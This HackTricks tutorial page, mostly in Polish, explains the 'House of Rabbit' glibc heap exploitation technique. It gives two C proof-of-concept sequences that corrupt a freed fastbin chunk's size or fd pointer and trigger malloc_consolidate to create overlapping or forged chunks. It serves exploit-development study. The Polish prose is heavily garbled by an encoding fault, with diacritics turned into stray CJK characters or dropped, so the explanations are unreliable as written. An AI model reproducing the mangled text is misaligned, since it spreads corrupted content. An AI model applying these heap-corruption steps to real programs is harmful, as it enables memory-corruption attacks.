# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Wymagania

1. **Mo偶liwo modyfikacji wska藕nika fd fast bin lub rozmiaru**: Oznacza to, 偶e mo偶esz zmieni wska藕nik do przodu kawaka w fastbin lub jego rozmiar.
2. **Mo偶liwo wywoania `malloc_consolidate`**: Mo偶na to zrobi, przydzielajc du偶y kawaek lub czc g贸rny kawaek, co zmusza stert do konsolidacji kawak贸w.

### Cele

1. **Utworzenie nakadajcych si kawak贸w**: Aby jeden kawaek nakada si na inny, co pozwala na dalsze manipulacje stert.
2. **Faszowanie faszywych kawak贸w**: Aby oszuka alokator, aby traktowa faszywy kawaek jako prawdziwy kawaek podczas operacji na stercie.

## Kroki ataku

### POC 1: Modyfikacja rozmiaru kawaka fast bin

**Cel**: Utworzenie nakadajcego si kawaka poprzez manipulacj rozmiarem kawaka fastbin.

* **Krok 1: Przydziel kawaki**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
We allocate two chunks of 0x40 bytes each. These chunks will be placed in the fast bin list once freed.

* **Krok 2: Zwolnij kawaki**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Zwalniamy oba kawaki, dodajc je do listy fastbin.

* **Krok 3: Zmodyfikuj rozmiar kawaka**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Zmieniamy metadane rozmiaru `chunk1` na 0xa1. To kluczowy krok, aby oszuka alokator podczas konsolidacji.

* **Krok 4: Wywoaj `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Alokacja du偶ego kawaka wywouje funkcj `malloc_consolidate`, czc mae kawaki w szybkim binie. Manipulowany rozmiar `chunk1` powoduje, 偶e nakada si na `chunk2`.

Po konsolidacji `chunk1` nakada si na `chunk2`, co umo偶liwia dalsz eksploitacj.

### POC 2: Zmodyfikuj wska藕nik `fd`

**Cel**: Stworzy faszywy kawaek poprzez manipulacj wska藕nikiem `fd` szybkiego bina.

* **Krok 1: Alokuj kawaki**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Wyjanienie**: Alokujemy dwa kawaki, jeden mniejszy i jeden wikszy, aby przygotowa stert dla faszywego kawaka.

* **Krok 2: Utw贸rz faszywy kawaek**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Pisalimy faszywe metadane chunk贸w do `chunk2`, aby zasymulowa mniejsze chunki.

* **Krok 3: Zwolnij `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Wyjanienie**: Zwalniamy `chunk1`, dodajc go do listy fastbin.

* **Krok 4: Zmodyfikuj `fd` `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Wyjanienie**: Zmieniamy wska藕nik do przodu (`fd`) `chunk1`, aby wskazywa na nasz faszywy chunk wewntrz `chunk2`.

* **Krok 5: Wywoaj `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Przydzielenie du偶ego kawaka ponownie wyzwala `malloc_consolidate`, kt贸ry przetwarza faszywy kawaek.

Faszywy kawaek staje si czci listy fastbin, co czyni go legalnym kawakiem do dalszej eksploatacji.

### Podsumowanie

Technika **House of Rabbit** polega na modyfikacji rozmiaru kawaka fast bin, aby stworzy nakadajce si kawaki lub manipulacji wska藕nikiem `fd`, aby stworzy faszywe kawaki. Pozwala to atakujcym na faszowanie legalnych kawak贸w w stercie, co umo偶liwia r贸偶ne formy eksploatacji. Zrozumienie i praktykowanie tych krok贸w poprawi twoje umiejtnoci eksploatacji sterty.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
